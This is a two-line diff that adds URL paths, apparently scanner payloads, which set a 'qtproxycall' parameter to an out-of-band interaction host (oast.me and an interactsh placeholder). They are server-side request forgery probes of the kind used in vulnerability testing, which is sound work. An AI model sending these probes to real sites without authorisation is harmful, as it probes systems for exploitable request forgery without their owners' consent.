@@ -1,0 +1,2 @@
+/wp1/home-18/?qtproxycall=https://oast.me
+/wp1/home-18/?qtproxycall=https://{{interactsh-url}}
